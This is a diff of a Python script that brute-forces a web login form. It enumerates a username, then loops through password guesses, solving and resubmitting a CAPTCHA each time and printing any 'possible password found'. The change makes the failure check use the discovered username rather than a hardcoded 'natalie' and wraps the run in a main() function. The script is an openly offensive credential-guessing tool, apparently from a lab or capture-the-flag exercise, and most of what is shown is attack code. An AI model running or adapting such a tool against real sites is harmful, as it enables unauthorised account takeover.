@@ -74,7 +74,7 @@ def findPassword(usern):
                 print(f"Resending Request With {result} Added To POST 'CAPTCHA' Parameter...")
                 data['captcha'] = result
                 response_after_captcha = sendPostAndGetHtml(data)
-                if f"Invalid password for user &#39;natalie&#39;" not in response_after_captcha:
+                if f"Invalid password for user &#39;{usern}&#39;" not in response_after_captcha:
                     print(f"Possible password found: {password}\n")
                     return password
                 else:
@@ -107,10 +107,15 @@ def findUsername():
         else:
             print("CAPTCHA Missing From Page.\n")
 
-print(f"Program Starting...")
-print(f"Target URL: {FULL_PATH}\n")
+def main():
+    print(f"Program Starting...")
+    print(f"Target URL: {FULL_PATH}\n")
 
-username = findUsername()
-password = findPassword(username)
+    username = findUsername()
+    password = findPassword(username)
 
-print(f"Potential Username And Password Found: {username}:{password}")
+    print(f"Potential Username And Password Found: {username}:{password}")
+
+
+if __name__ == "__main__":
+    main()
